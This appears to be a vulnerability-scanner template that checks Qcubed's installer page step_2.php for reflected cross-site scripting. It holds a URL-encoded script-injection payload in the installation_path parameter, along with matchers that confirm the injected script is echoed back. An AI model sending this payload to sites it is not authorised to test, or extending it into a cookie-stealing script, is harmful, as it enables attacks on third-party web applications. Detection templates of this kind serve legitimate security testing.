id: "qcubed-xss"
name: "Qcubed - Cross-Site Scripting"
severity: "high"
description: "Qcubed contains a cross-site scripting vulnerability which allows a remote attacker to inject arbitrary JavaScript via the /assets/php/_devtools/installer/step_2.php endpoint and the installation_path parameter."
tech:
  - "php"
tags:
  - "xss"
  - "qcubed"
  - "vuln"
cwe: "CWE-79"
reference: "https://github.com/qcubed/qcubed/issues/1230"
spaExclusion: true
request:
  method: "GET"
  path: "/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "</script><script>alert(document.domain)</script>"
  - type: "status"
    status:
      - 200
  - type: "word"
    part: "header"
    words:
      - "text/html"
